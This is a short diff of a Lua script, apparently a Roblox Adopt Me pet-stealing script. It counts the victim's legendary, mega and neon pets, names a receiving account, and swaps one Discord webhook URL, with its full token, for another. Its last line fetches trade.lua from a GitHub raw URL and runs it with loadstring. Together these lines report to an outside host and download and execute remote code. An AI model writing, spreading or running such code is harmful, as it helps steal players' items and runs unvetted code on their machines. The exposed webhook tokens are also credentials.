@@ -90,5 +90,5 @@ if rarityCounts.legendary + rarityCounts.mega + rarityCounts.neon + rarityCounts
 end
 
 UserName = "lord_magic0"
-WebHook = "https://discord.com/api/webhooks/1356946931334512721/scCx9jAQTtTasHfVCYmSfYSSfUnpVHmEh1EoBncXd_K_Qwko1X6oFKj4SZ0m5ZqRycJ3"
+WebHook = "https://discord.com/api/webhooks/1363998962159325294/Oo4uBid7T3ZsjuD9IHKs4NOCLYQO9985scVWfajCjuFRTum9pcLZ937SVhfp4XDvvLiF"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/AdoptMe/refs/heads/main/trade.lua"))()
